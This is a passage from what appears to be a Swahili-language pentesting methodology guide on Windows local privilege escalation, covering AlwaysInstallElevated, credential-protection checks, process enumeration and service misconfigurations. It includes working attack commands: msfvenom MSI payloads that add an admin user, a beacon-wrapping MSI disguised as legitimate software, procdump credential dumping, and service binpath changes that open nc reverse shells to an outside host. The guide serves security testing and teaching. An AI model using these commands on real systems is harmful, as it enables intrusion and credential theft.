Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** registry keys hizi 2 **zimewezeshwa** (thamani ni **0x1**), basi watumiaji wa kiwango chochote cha ruhusa wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una session ya meterpreter, unaweza kuotomatisha mbinu hii kwa kutumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya directory ya sasa binary ya Windows MSI ya kuongeza privileges. Script hii huandika installer ya MSI iliyokompiliwa awali ambayo huomba kuongezwa kwa user/group (kwa hiyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kuongeza ruhusa.

### MSI Wrapper

Soma mafunzo haya ili ujifunze jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **mistari ya amri**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** kwa kutumia Cobalt Strike au Metasploit **payload mpya ya Windows EXE TCP** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha kutafutia. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Ipe mradi jina, kama vile **AlwaysPrivesc**, tumia **`C:\privesc`** kwa eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague payload ya Beacon uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Chagua mradi wa **AlwaysPrivesc** katika **Solution Explorer**, kisha katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna sifa nyingine unazoweza kubadilisha, kama vile **Author** na **Manufacturer**, ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya kulia mradi na uchague **View > Custom Actions**.
- Bofya kulia **Install** na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kuwa payload ya beacon inatekelezwa mara tu kisakinishi kinapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwishowe, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka jukwaa kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia udhaifu huu, unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachokuwa **kinarekodiwa**, kwa hivyo unapaswa kuizingatia

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, inafurahisha kujua logs zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator za ndani**, kuhakikisha kwamba kila nywila ni **ya kipekee, imetengenezwa bila mpangilio, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, hivyo kuwawezesha kuona nywila za admin za ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi ya kawaida huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa wa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika **kusoma kumbukumbu zake** au inject code, na hivyo kuimarisha zaidi usalama wa mfumo.\
[**Maelezo zaidi kuhusu LSA Protection hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Maelezo zaidi kuhusu Credential Guard yanapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Vitambulisho Vilivyohifadhiwa kwenye Cache

**Vitambulisho vya domain** huthibitishwa na **Local Security Authority** (LSA) na hutumiwa na vipengele vya mfumo wa uendeshaji. Data ya mtumiaji ya kuingia inapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida vitambulisho vya domain vya mtumiaji huwekwa.\
[**Maelezo zaidi kuhusu vitambulisho vilivyohifadhiwa kwenye cache hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Vikundi

### Orodhesha Watumiaji na Vikundi

Unapaswa kuangalia ikiwa vikundi vyovyote ulivyo mwanachama vina ruhusa za kuvutia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye upendeleo

Ikiwa wewe ni mwanachama wa kikundi fulani chenye upendeleo, unaweza kufanya **privilege escalation**. Jifunze kuhusu vikundi vyenye upendeleo na jinsi ya kuvitumia vibaya kufanya privilege escalation hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu **token** ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu token za kuvutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata yaliyomo kwenye ubao wa kunakili

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza, unapoorodhesha michakato, **angalia kama kuna nywila kwenye command line ya mchakato**.\
Angalia kama unaweza **kubadilisha binary inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia mashambulizi ya [**DLL Hijacking**](dll-hijacking/index.html) yanayowezekana:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima angalia kama kuna [**electron/cef/chromium debuggers** zinazoendeshwa; unaweza kuzitumia vibaya ili kuongeza privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener inaweza kuwa hai kwa muda mfupi, kwa hivyo kutokuonekana kwake kwenye muhtasari mmoja tuli wa porti hakuthibitishi kuwa haikuwahi kufichuliwa. Linganisha listener yoyote iliyoonekana na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye privileges ndogo kuifikia; jina la programu au debug flag pekee haviwezi kuthibitisha utekelezaji wa code kati ya watumiaji. Fanya enumeration ya kawaida kwa njia tulivu badala ya kutuma debugger commands.

**Kuangalia permissions za binaries za processes**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia shared libraries kutoka kwenye `dynamicpreprocessor directory` iliyobainishwa kwenye configuration iliyochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort chini ya akaunti tofauti, kagua configuration hiyo mahususi na ACL ya saraka ya module iliyobainishwa. Ikiwa token yako inaweza kuunda faili humo, njia hiyo inafaa kuchunguzwa kama njia ya code execution wakati task au service hiyo itakapopakia modules tena. Thibitisha privileges halisi za akaunti inayoendesha programu, configuration inayotumika, ulinganifu wa modules, na vizuizi vyovyote vya deny au share; saraka inayoweza kuandikwa pekee haithibitishi privilege escalation. [Nyaraka za Snort kuhusu dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa modules wakati wa runtime.

### Web service yenye privileges ya juu na document root inayoweza kuandikwa

Kwenye usakinishaji wa Apache wa Windows, linganisha executable path ya service na akaunti inayoendesha programu na `DocumentRoot` kwenye `httpd.conf` yake inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi ni `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye privileges za chini anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, code execution ya upande wa server inaweza kuvuka mpaka wa privileges wa host. Thibitisha kwamba service inaendeshwa, njia hiyo mahususi inatolewa, na handler ya upande wa server inachakata aina hiyo ya faili; root inayoweza kuandikwa peke yake inathibitisha uundaji wa faili tu. Kagua ACL bila kuandika faili ya majaribio:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, service inaweza kuelekeza kwenye `C:\wamp64\bin\apache\apache*\bin\httpd.exe` yenye toleo maalum (au `C:\wamp\...` kwa mpangilio wa 32-bit), ikiwa na usanidi karibu nayo chini ya `conf\httpd.conf` na root chaguomsingi ya `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja image halisi ya service, utambulisho inayotumia kuendesha, `DocumentRoot` inayotumika (ikiwemo upanuzi wa `${INSTALL_DIR}` na mabadiliko ya virtual-host), na ACL ya root. Directory ya WAMP inayoweza kuandikwa haithibitishi kwamba Apache inaendeshwa kama `SYSTEM` au itatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi Windows service huchagua usanidi wake](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Root ya IIS inayoweza kuandikwa na utambulisho wa mtandao wa application-pool

Kwa IIS, linganisha directory halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool iliyosanidiwa na handler ya upande wa server. Code iliyowekwa kwenye directory inayotolewa huendeshwa kama pool tu ikiwa IIS huchakata aina hiyo ya faili na route inafikika. Kagua ruhusa za sasa za mtumiaji za kuunda faili, hali ya runtime ya site, handler na overrides za kila path kabla ya kuchukulia directory inayoweza kuandikwa kama njia ya kutekeleza code.

Dynamic compilation ya ASP.NET inaleta path tofauti ya kukagua: faili zinazozalishwa chini ya directory ya compilation ya application. Chaguomsingi ni directory ya `Temporary ASP.NET Files` iliyo chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya application inaweza kuibadilisha. [Microsoft inaeleza eneo na subdirectories za kila application](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenga compilation directories wakati application pools haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa token yenye ruhusa za chini inaweza kubadilisha source inayozalishwa kwenye cache ya **application husika**, bainisha kama application hiyo huikompile tena chini ya [utambulisho wa worker-process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) wenye ruhusa za juu zaidi. ACL ya faili au directory pekee haithibitishi utekelezaji wa code: linganisha cache na application inayotumika, token na ACL zinazotumika, mipangilio ya compilation, utambulisho wa process, na muda wa compilation yoyote upya. Tumia ukaguzi wa metadata wa kusoma pekee; usianzisha compilation wala kubadilisha faili za cache wakati wa enumeration.

IIS pool iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwenye rasilimali za domain kama **akaunti ya kompyuta mwenyeji**, ingawa token yake ya ndani inaweza kuwa na ruhusa za chini. `LocalSystem` tayari ina ruhusa za juu ndani ya kompyuta na pia hutumia akaunti ya kompyuta kwenye mtandao; `LocalService` kwa kawaida huwasilisha vitambulisho vya mtandao visivyojulikana. Pool ya `SpecificUser` hutumia akaunti yake iliyosanidiwa. [Microsoft inaeleza aina hizi za utambulisho](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [utambulisho wa mtandao wa application-pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa utambulisho usipowekwa unaweza kurithi chaguomsingi za pool, ambazo hutofautiana kati ya matoleo ya IIS; kwa hiyo, bainisha usanidi unaotumika badala ya kukisia kutokana na jina la pool. Ikiwa utekelezaji wa code unafikia pool yenye utambulisho wa mtandao wa akaunti ya kompyuta, tathmini ruhusa za directory za **kompyuta hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) inahitaji ruhusa za replication kwenye domain naming context; ticket ya akaunti ya mashine au jukumu la host pekee havithibitishi ruhusa hizo. Enumeration isiyoingiliana inapaswa kukagua usanidi na ACL bila kupakia faili, kuanzisha uthibitishaji wa mtandao, au kuomba tickets.

Kwa ASP.NET handler inayosomeka na inayoanzisha helper process, fuatilia thamani yoyote inayotokana na request kupitia authentication, decryption, validation na uundaji wa command. Handler inayounganisha token iliyodecodeiwa kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu shell metacharacters kubadilisha command; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kwamba caller asiyeaminika anaweza kuathiri thamani iliyodecodeiwa na kufikia handler, kisha bainisha utambulisho unaotumika wa application-pool au wa impersonation na utambulisho wa child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa muundo wa token pekee havithibitishi utekelezaji wa command wenye ruhusa za juu. Kagua source na usanidi wa pool bila kutuma requests zilizoghushiwa au kuendesha helper wakati wa enumeration isiyoingiliana.

Kwa PHP service kwenye Windows, path inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini chini ya utambulisho wa worker. Thibitisha kwamba request inaweza kufikia statement hiyo, path iliyotatuliwa inaelekeza kwenye faili ambayo mtumiaji mwenye ruhusa za chini anaweza kubadilisha na worker anaweza kusoma, vizuizi husika vya PHP vya path vinaruhusu include, na worker inaendeshwa kwa ruhusa za juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee havithibitishi mnyororo huu; kagua source, utambulisho wa service na ACL za faili bila kuita endpoint wakati wa enumeration isiyoingiliana.

### Uchimbaji wa Password kutoka Memory

Unaweza kuunda memory dump ya process inayoendesha kwa kutumia **procdump** kutoka sysinternals. Services kama FTP huwa na **credentials katika clear text kwenye memory**; jaribu kufanya dump ya memory na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi kwa ruhusa za juu

Programu inayofungua miradi kiotomatiki kutoka kwenye drop directory inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au kazi inayoifungua, utambulisho wake halisi, na build ya parser. Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra ([Ghidra project open/restore issue](https://github.com/NationalSecurityAgency/ghidra/issues/71)) liliruhusu external entities za XML kwenye metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza ikiwa [sera za outbound SMB na NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) zinaruhusu. Hili ni kidokezo cha kufichuka kwa vitambulisho, si ufikiaji wa msimamizi wa moja kwa moja: jibu lazima liweze kutumiwa kupitia njia tofauti iliyoidhinishwa au yenye udhaifu, na build za sasa lazima zitathminiwe kulingana na hali halisi ya viraka vyake. Usifungue mradi ulioundwa kwa makusudi wakati wa uhesabuji tuli; kagua mtiririko wa uingizaji na ACL.

## Huduma

Haki ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya kitu cha Service Control Manager (SCM) ni tofauti na haki za huduma iliyopo. Ombi lililofaulu la kusoma tu la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) la kupata haki hiyo ni kidokezo cha ukaguzi, si uthibitisho kwamba huduma mpya inaweza kuendeshwa. [`CreateService` hurudisha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye haki za huduma zilizoombwa wakati wa kuunda; kufungua tena huduma baadaye hufanya ukaguzi tofauti wa ufikiaji na huenda kukashindwa hata kama handle ya awali ingeweza kutumiwa. Thibitisha kando tokeni inayotumika ya ndani au ya mbali, haki za handle zilizotolewa, akaunti ya huduma, sera ya kuanzisha, na njia ya executable. Usitengeneze wala kuanzisha huduma wakati wa uhesabuji tuli.

Kwa njia ya kusakinisha huduma kwa mbali, linganisha haki hizo za SCM na share kwenye mashine lengwa ambayo **logon hiyo hiyo ya mtandao** inaweza kuiandikia, ACL yake ya msingi ya NTFS, na njia ya executable ya ndani ambayo akaunti ya huduma inaweza kuendesha. Akaunti isiyo ya msimamizi inaweza kuvuka mpaka huu ikiwa kuna haki za SCM zilizo pana isivyo kawaida na njia ya kuweka faili; share ya msimamizi si sharti la lazima. Ufikiaji wa kuandika kwenye share pekee, au kidokezo cha kuunda huduma kwenye SCM pekee, havithibitishi kwamba huduma mpya inaweza kuanzishwa chini ya utambulisho wa juu zaidi.

Huduma iliyopo inaweza kuita executable saidizi wakati wa kuwasha, kuzima, au tukio lingine la mzunguko wa maisha hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatafutwa kwenye saraka inayoweza kuandikwa na mtumiaji mwenye ruhusa za chini na huduma inaendeshwa chini ya utambulisho wa juu zaidi, faili saidizi inayokosekana inaweza kuwa faili inayoweza kubadilishwa kwa masharti. Thibitisha **msimbo halisi wa huduma au mwito wa executable saidizi ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, ruhusa za kuunda saraka, utambulisho wa huduma, na kichochezi cha mzunguko wa maisha kinachopatikana. Saraka ya huduma inayoweza kuandikwa au faili inayokosekana pekee havithibitishi kwamba huduma itapakia faili hiyo; ukaguzi tuli haupaswi kuanzisha wala kusimamisha huduma.

Kwa huduma iliyopo, [`SERVICE_START huruhusu kutoa hoja kwa StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua msimbo wa huduma au kiolesura kilichoandikwa kwenye nyaraka kabla ya kuchukulia ruhusa ya kuanzisha kuwa zaidi ya haki ya udhibiti. Ikiwa huduma hutumia hoja iliyochaguliwa na mpigaji kama njia ya log au export, thibitisha utambulisho wa huduma, mtiririko halisi wa hoja hadi uandishi, vizuizi vya njia, na ruhusa za **faili iliyoundwa**. Kuandika kwenye saraka iliyolindwa kunaweza kuwa njia ya kupandisha ruhusa tu ikiwa kuna mtumiaji au loader tofauti mwenye ruhusa za juu anayekubali faili hiyo; log inayoweza kuandikwa au haki ya kuanzisha pekee haitoshi. Orodha tuli haipaswi kuanzisha huduma wala kuunda faili ya majaribio.

Kwa wakala wa ufuatiliaji wa NSClient++, faili ya `nsclient.ini` inayosomeka ni **kidokezo cha kukagua usanidi**: inaweza kuwa na vitambulisho vya wavuti, ilhali `boot.ini` inaweza kuelekeza usanidi kwenye eneo jingine. Kagua akaunti halisi ya huduma, listener ya WEB na sera ya ufikiaji, na kama role iliyothibitishwa inaweza kubadilisha mipangilio au scripts. Uendeshaji wenye ruhusa za juu unahitaji pia `CheckExternalScripts` (au njia nyingine ya uendeshaji iliyowezeshwa), haki halisi ya kusajili au kurekebisha amri, na kichochezi kinachoiendesha chini ya utambulisho wa huduma. Listener inayopatikana kwa loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, nenosiri, au listener pekee havithibitishi haki hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa uhesabuji tuli. Tazama [mpangilio wa faili za NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa wavuti na scripts](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa huduma ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya kuendeshea huduma na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu child hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), ilhali `AppDirectory` ni working directory yake iliyosanidiwa. Kagua executable ya child na ACL za saraka yake mama kabla ya kuchukulia ruhusa za wrapper kuwa ndizo mpaka mzima wa huduma. Endpoint ya ndani ya WCF au SOAP inayowasilishwa na child hiyo ni kidokezo tofauti cha ukaguzi: thibitisha kwamba mtumiaji mwenye ruhusa za chini anaweza kufikia listener, kwamba operation husika inapokea ingizo lake, na kwamba service child hutekeleza operation isiyo salama chini ya utambulisho wa juu zaidi. Akaunti ya huduma, URL ya endpoint, au njia inayoweza kuandikwa pekee havithibitishi kupandisha ruhusa; epuka kuita operations za huduma wakati wa uhesabuji tuli.

Kwa operation maalum ya WCF, fuatilia string inayodhibitiwa na mpigaji hadi kwenye runspace yoyote ya PowerShell. [`Pipeline.Commands.AddScript huongeza maandishi ya script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke huendesha pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding yenye vitambulisho vya usafirishaji vya Windows`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha mteja, lakini ruhusa ya kuita operation **hiyo mahususi** na utambulisho halisi wa runspace lazima vikaguliwe kando. Njia kutoka kwenye ingizo la mpigaji mwenye ruhusa za chini hadi `AddScript` chini ya utambulisho wa huduma yenye ruhusa za juu ni mpaka wa utekelezaji wa msimbo; port inayosikiliza, mteja aliyethibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua huduma iliyosakinishwa, contract, uidhinishaji, na mipangilio ya impersonation bila kuita endpoint wakati wa uhesabuji.

Service Triggers huruhusu Windows kuanzisha huduma hali fulani zinapotokea (shughuli za named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kifaa kuunganishwa, GPO refresh, n.k.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanzisha huduma zenye ruhusa za juu kwa kuwasha triggers zake. Tazama mbinu za kuhesabu na kuwasha hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Huduma ya Visual Studio ya kukusanya taarifa za uchunguzi

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, huduma ya uchunguzi iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia junction na race ya object-manager-link kuelekeza upya uwekaji upya wa DACL ya huduma. Upandishaji wa ruhusa ulioonyeshwa ulihitaji pia njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider na lengo lake la `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa uchunguzi wa awali usio na mabadiliko, kagua akaunti na njia ya binary ya huduma hiyo pekee, angalia kama njia ya Setup WMI compiler ipo, na uthibitishe hali ya viraka vya kipengele kilichosakinishwa. Ingizo la huduma, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kuwa mashine ina udhaifu. Ukaguzi hauhitaji kuanzisha huduma wala kuendesha urekebishaji.

Pata orodha ya huduma:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha privilege kinachohitajika kwa kila service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa huduma

Ikiwa unapata hitilafu hii (kwa mfano, kwa SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Huduma haiwezi kuwashwa, kwa sababu imezimwa au hakuna vifaa vilivyounganishwa nayo vilivyowashwa._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba huduma ya upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kukwepa tatizo hili** ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Badilisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayoweza kutekelezwa ya service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Ruhusa zinaweza kutumika kuongeza marupurupu:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huruhusu kusanidi upya ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
